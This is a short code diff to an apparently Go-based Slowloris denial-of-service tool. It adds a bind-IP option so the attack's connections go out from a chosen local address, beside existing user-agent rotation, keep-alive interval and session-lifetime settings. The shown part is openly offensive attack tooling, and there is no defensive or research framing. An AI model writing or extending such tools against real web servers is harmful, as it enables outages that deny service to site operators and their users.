@@ -18,6 +18,7 @@ type Slowloris struct {
 	maxSessionLife    time.Duration
 	userAgents        []string
 	activeConnections int64
+	localAddr         *net.TCPAddr
 }
 
 var defaultUserAgents = []string{
@@ -37,12 +38,13 @@ func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-func NewSlowloris(keepAliveInterval time.Duration) *Slowloris {
+func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
 	return &Slowloris{
 		keepAliveInterval: keepAliveInterval,
 		connectionTimeout: 10 * time.Second,
 		maxSessionLife:    5 * time.Minute,
 		userAgents:        defaultUserAgents,
+		localAddr:         newLocalTCPAddr(bindIP),
 	}
 }
 
@@ -57,7 +59,8 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 
 	var conn net.Conn
 	dialer := &net.Dialer{
-		Timeout: s.connectionTimeout,
+		Timeout:   s.connectionTimeout,
+		LocalAddr: s.localAddr,
 	}
 
 	if useTLS {
